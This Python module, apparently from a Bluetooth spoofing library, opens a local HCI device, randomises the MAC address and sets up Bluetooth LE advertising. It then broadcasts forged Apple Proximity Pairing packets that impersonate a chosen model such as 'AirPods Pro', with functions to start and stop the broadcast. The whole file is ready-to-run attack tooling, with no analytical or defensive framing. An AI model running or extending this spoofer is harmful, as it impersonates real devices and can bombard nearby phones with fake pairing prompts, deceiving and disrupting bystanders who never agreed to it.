import struct
import random
import apybluez.bluetooth._bluetooth as _bt
from ..apple.proximity import ProximityPairingPacket
from ..exceptions import HCISpoofingError


OGF_LE_CTL = 0x08
OCF_LE_SET_RANDOM_ADDRESS = 0x0005
OCF_LE_SET_ADVERTISING_PARAMETERS = 0x0006
OCF_LE_SET_ADVERTISE_ENABLE = 0x000A
OCF_LE_SET_ADVERTISING_DATA = 0x0008

def _set_random_address(sock, addr_bytes):
    if len(addr_bytes) != 6:
        raise ValueError("Address must be 6 bytes")
    cmd_pkt = struct.pack("<6B", *addr_bytes) 
    _bt.hci_send_cmd(sock, OGF_LE_CTL, OCF_LE_SET_RANDOM_ADDRESS, cmd_pkt)

def _set_advertising_parameters(sock, min_interval=0x00A0, max_interval=0x00A0, 
                                adv_type=0x03, own_bdaddr_type=0x01): 

    
    cmd_pkt = struct.pack("<HHBBB6BBB", 
                          min_interval, max_interval, 
                          adv_type, own_bdaddr_type, 
                          0, 0, 0, 0, 0, 0, 0, 
                          0x07, 
                          0)
    _bt.hci_send_cmd(sock, OGF_LE_CTL, OCF_LE_SET_ADVERTISING_PARAMETERS, cmd_pkt)

def start_spoof(model_name="AirPods Pro", device_id=0, interval_min=160, interval_max=160, random_mac=True):
    """
    Starts spoofing the specified model using efficient HCI commands.
    If random_mac is True, generates a random static address.
    If random_mac is bytes, uses that address.
    """
    try:
        sock = _bt.hci_open_dev(device_id)
    except Exception as e:
        raise HCISpoofingError(f"Error opening HCI device {device_id}: {e}")

    if random_mac:
        try:
            if isinstance(random_mac, bytes):
                addr = random_mac
            else:
                addr = bytes([random.randint(0, 255) for _ in range(6)])
            
            _set_random_address(sock, addr)
        except Exception as e:
             raise HCISpoofingError(f"Failed to set random address: {e}")

    try:
        _set_advertising_parameters(sock, min_interval=interval_min, max_interval=interval_max, own_bdaddr_type=0x01)
    except Exception as e:
        raise HCISpoofingError(f"Failed to set advertising params: {e}")

    try:
        ad_data = ProximityPairingPacket.build(model_name=model_name)
    except ValueError as e:
        raise HCISpoofingError(f"Failed to build packet for model {model_name}: {e}")
    
    if len(ad_data) > 31:
        ad_data = ad_data[:31]

    if hasattr(_bt, "hci_le_set_advertising_data"):
        try:
            _bt.hci_le_set_advertising_data(sock, ad_data)
        except Exception as e:
             raise HCISpoofingError(f"Failed to set advertising data: {e}")
    else:
        raise HCISpoofingError("Optimized hci_le_set_advertising_data not found in C extension.")
    
    try:
        enable_cmd = b'\x01'
        _bt.hci_send_cmd(sock, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE, enable_cmd)
    except Exception as e:
        raise HCISpoofingError(f"Failed to enable advertising: {e}")
    
    return sock

def stop_spoof(sock):
    if sock:
        disable_cmd = b'\x00'
        _bt.hci_send_cmd(sock, 0x08, 0x000A, disable_cmd)
        sock.close()
